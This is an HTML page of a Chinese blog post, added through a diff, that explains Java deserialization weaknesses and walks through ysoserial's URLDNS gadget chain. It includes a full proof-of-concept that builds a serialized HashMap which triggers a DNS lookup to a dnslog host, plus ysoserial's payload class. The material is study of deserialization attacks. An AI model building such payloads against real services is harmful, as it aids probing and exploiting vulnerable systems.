@@ -1,0 +1,359 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>JAVA序列化与反序列化 | Yyx</title>
+<meta name="description" content="&lt;marquee&gt;&lt;script type=&#34;text/javascript&#34; src=&#34;https://api.xygeng.cn/one/get/&#34;&gt;&lt;/script&gt;&lt;/marquee&gt;">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://www.yyxyy.xyz//favicon.ico?v=1679213027217">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://www.yyxyy.xyz//styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://www.yyxyy.xyz/">
+        <img class="avatar" src="https://www.yyxyy.xyz//images/avatar.png?v=1679213027217" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://www.yyxyy.xyz/">
+        <h1 class="site-title">Yyx</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">JAVA序列化与反序列化</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2022-03-03</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://www.yyxyy.xyz/tag/java/">
+                    JAVA
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <h1 id="概述">概述</h1>
+<p>大概意思：</p>
+<pre><code class="language-c">序列化：对象 -&gt; 字符串
+反序列化：字符串 -&gt; 对象
+</code></pre>
+<h1 id="几种创建的序列化和反序列化协议">几种创建的序列化和反序列化协议</h1>
+<ul>
+<li>XML&amp;SOAP</li>
+<li>JSON</li>
+<li>Protobuf</li>
+</ul>
+<h1 id="序列化与反序列化基本实现">序列化与反序列化基本实现</h1>
+<p>将序列化功能封装进了 <strong>serialize</strong> 这个方法里面，在序列化当中，我们通过这个 FileOutputStream 输出流对象，将序列化的对象输出到 ser.bin 当中。再调用 oos 的 writeObject 方法，将对象进行序列化操作。</p>
+<h2 id="serialization"><strong>Serialization</strong></h2>
+<pre><code class="language-java">ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+oos.writeObject(obj);
+</code></pre>
+<h2 id="unserialize"><strong>Unserialize</strong></h2>
+<pre><code class="language-java">ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+Object obj = ois.readObject();
+</code></pre>
+<h1 id="序列化的安全问题">序列化的安全问题</h1>
+<h2 id="重要函数">重要函数</h2>
+<p>writeObject 和 readObject</p>
+<h2 id="存在安全漏洞的形式">存在安全漏洞的形式</h2>
+<h3 id="0x01-入口类的-readobject-直接调用危险方法">0x01 入口类的 readObject 直接调用危险方法</h3>
+<h3 id="0x02-入口参数中包含可控类该类有危险方法readobject-时调用">0x02 入口参数中包含可控类，该类有危险方法，readObject 时调用</h3>
+<h3 id="0x03-入口类参数中包含可控类该类又调用其他有危险方法的类readobject-时调用">0x03 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用</h3>
+<h3 id="0x04-构造函数静态代码块等类加载时隐式执行">0x04 构造函数/静态代码块等类加载时隐式执行</h3>
+<h2 id="漏洞的攻击路线">漏洞的攻击路线</h2>
+<p>首先的攻击前提：继承 Serializable</p>
+<p>入口类：source （重写 readObject 调用常见的函数；参数类型宽泛，比如可以传入一个类作为参数；最好 jdk 自带）</p>
+<p>找到入口类之后要找调用链 gadget chain 相同名称、相同类型</p>
+<p>执行类 sink （RCE SSRF 写文件等等）比如 exec 这种函数</p>
+<h1 id="urldns-分析">URLDNS 分析</h1>
+<p>urldns 地址</p>
+<p>https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</p>
+<p>利用链</p>
+<pre><code class="language-java">Gadget Chain:     
+    HashMap.readObject()         
+    	HashMap.putVal()             
+    		HashMap.hash()                 
+    			URL.hashCode()
+</code></pre>
+<p>先看 Hashmap 的readobject方法</p>
+<pre><code class="language-java">//还有一堆省略了
+for (int i = 0; i &lt; mappings; i++) {
+    @SuppressWarnings(&quot;unchecked&quot;)
+        K key = (K) s.readObject();
+    @SuppressWarnings(&quot;unchecked&quot;)
+        V value = (V) s.readObject();
+    putVal(hash(key), key, value, false, false);
+}
+</code></pre>
+<p>跟进hash函数</p>
+<pre><code class="language-plain">static final int hash(Object key) {
+    int h;
+    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);
+}
+</code></pre>
+<p>这里使用的是key.hashcode。于是需要寻找key来源。</p>
+<p>在POC里面URL需要使用hashmap.put()方法，</p>
+<pre><code class="language-java">hashmap.put(new URL(&quot;DNS地址以&quot;),1);
+</code></pre>
+<p>跟进put方法。</p>
+<pre><code class="language-plain">public V put(K key, V value) {
+    return putVal(hash(key), key, value, false, true);
+}
+</code></pre>
+<p>发现调用了hash函数，hash里面的key便是传的URL参数。</p>
+<p>跟进URL里面查找hashcode().</p>
+<pre><code class="language-java">public synchronized int hashCode() {
+    if (hashCode != -1)
+        return hashCode;
+
+    hashCode = handler.hashCode(this);
+    return hashCode;
+}
+</code></pre>
+<p>继续跟进handler。</p>
+<pre><code class="language-java">transient URLStreamHandler handler;
+</code></pre>
+<p>继续跟进URLStreamHandler，寻找hashcode。</p>
+<pre><code class="language-java">protected int hashCode(URL u) {
+    int h = 0;
+
+// Generate the protocol part.
+String protocol = u.getProtocol();
+if (protocol != null)
+    h += protocol.hashCode();
+
+// Generate the host part.
+InetAddress addr = getHostAddress(u);
+if (addr != null) {
+    h += addr.hashCode();
+} else {
+    String host = u.getHost();
+    if (host != null)
+        h += host.toLowerCase().hashCode();
+}
+</code></pre>
+<p>继续跟进hostAddress()</p>
+<pre><code class="language-plain">protected InetAddress getHostAddress(URL u) {
+    return u.getHostAddress();
+}
+</code></pre>
+<p>继续跟进</p>
+<pre><code class="language-plain">synchronized InetAddress getHostAddress() {
+    if (hostAddress != null) {
+        return hostAddress;
+    }
+
+    if (host == null || host.isEmpty()) {
+        return null;
+    }
+    try {
+        hostAddress = InetAddress.getByName(host);
+    } catch (UnknownHostException | SecurityException ex) {
+        return null;
+    }
+    return hostAddress;
+}
+</code></pre>
+<p>这⾥ InetAddress.getByName(host) 的作⽤是根据主机名，获取其 IP 地址，在⽹络上其实就是⼀次 DNS 查询。到这⾥就不必要再跟了。</p>
+<h2 id="利用链">利用链</h2>
+<ol>
+<li>HashMap-&gt;readObject()</li>
+<li>HashMap-&gt;hash()</li>
+<li>URL-&gt;hashCode()</li>
+<li>URLStreamHandler-&gt;hashCode()</li>
+<li>URLStreamHandler-&gt;getHostAddress()</li>
+<li>InetAddress-&gt;getByName()</li>
+</ol>
+<h2 id="urldns-反序列化利用链的-poc">URLDNS 反序列化利用链的 POC</h2>
+<pre><code class="language-plain">package org.example;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.net.URL; import java.util.HashMap;
+public class URLDNS {
+    public static void main(String[] args) throws Exception {
+        // new一个 HashMap 出来，这是此 gadget 的起点；
+        // 然后设置需要访问的url
+        HashMap hashMap = new HashMap();
+        URL url = new URL(&quot;http://aer4rt.dnslog.cn&quot;);
+        // 将私有的 hashCode 设置为可以更改
+        Field field = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);
+        field.setAccessible(true);
+        // 设置 url 对象内的 hashCode 为 0x123
+        field.set(url, 0x123);
+        // 将键值存入hashMap
+        hashMap.put(url, &quot;qqq&quot;);
+        // 设置 url 对象内的 hashCode 为 -1（不可更改）
+        field.set(url, -1);
+        // 序列化，写入文件
+        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./out.ser&quot;));
+        outputStream.writeObject(hashMap);
+        outputStream.close();
+        // 反序列化，读取文件
+        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./out.ser&quot;));
+        inputStream.readObject();
+        inputStream.close();
+    }
+}
+</code></pre>
+<h2 id="注意">注意</h2>
+<p>我们需要注意hashmap中的put方法。</p>
+<pre><code class="language-java">public V put(K key, V value) {
+    return putVal(hash(key), key, value, false, true);
+}
+</code></pre>
+<p>在URL对象再初始化之后的hashCode默认为-1。也就是说生成payload的过程中，如果不做任何修改就直接把URL对象放入HashMap是在本地触发一次DNS查询的。</p>
+<p>注释field.set(url, 0x123);发现默认为-1</p>
+<p><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/image.png" alt="img" loading="lazy"><br>
+这时候hashCode默认为-1，然后就会进入hash(key)触发DNS查询。这就会混淆是你本地的查询还是对方机器的查询的DNS。在put之前修改个hashCode，就可以避免触发。</p>
+<p>而在put了之后，需要field.set(url, -1);把这个字段修改回来，去触发DNS请求。</p>
+<h2 id="查看yso做法">查看yso做法</h2>
+<pre><code class="language-java">public class URLDNS implements ObjectPayload&lt;Object&gt; { 
+    public Object getObject(final String url) throws Exception { 
+        //Avoid DNS resolution during payload creation 
+        //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload. 
+        URLStreamHandler handler = new SilentURLStreamHandler(); 
+        HashMap ht = new HashMap(); 
+        // HashMap that will contain the URL 
+        URL u = new URL(null, url, handler); // URL to use as the Key 
+        ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. 
+        Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. 
+        return ht; 
+    } 
+    public static void main(final String[] args) throws Exception { 
+        PayloadRunner.run(URLDNS.class, args); 
+    } 
+    static class SilentURLStreamHandler extends URLStreamHandler { 
+        protected URLConnection openConnection(URL u) throws IOException { 
+            return null; 
+        } 
+        protected synchronized InetAddress getHostAddress(URL u) { 
+            return null; 
+        } 
+    } 
+}
+</code></pre>
+<p>它代码中没有使用 field.set(url, 0x123); ，但是自定了一个类为 SilentURLStreamHandler，这个类重写了getHostAddress() 函数，重写后的 getHostAddress() 是个空的，也就导致在本地生成 poc 的时候不会有 DNS 请求。</p>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://www.yyxyy.xyz/post/springboot-xue-xi/">
+              <h3 class="post-title">
+                下一篇：Springboot 学习
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan"><marquee><script type="text/javascript" src="https://api.xygeng.cn/one/get/"></script></marquee></div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  Powered by Gridea | <a class="rss" href="https://www.yyxyy.xyz//atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
